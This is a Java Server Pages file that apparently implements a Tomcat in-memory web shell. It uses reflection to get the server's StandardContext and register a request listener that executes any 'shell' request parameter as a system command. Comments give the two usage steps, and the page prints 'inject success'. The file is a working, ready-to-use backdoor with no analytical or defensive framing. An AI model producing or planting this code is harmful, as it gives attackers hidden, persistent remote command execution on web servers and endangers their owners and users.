<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<!-- 1、exec this-->
<!-- 2、request any url with a parameter of "shell" -->

<%
class S implements ServletRequestListener{
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        if(request.getParameter("shell") != null){
            try {
                Runtime.getRuntime().exec(request.getParameter("shell"));
            } catch (IOException e) {}
        }
    }
}
%>

<%
ServletContext servletContext =  request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
out.println("inject success");
S servletRequestListener = new S();
standardContext.addApplicationEventListener(servletRequestListener);
%>
<!-- 1、exec this-->
<!-- 2、request any url with a parameter of "shell" -->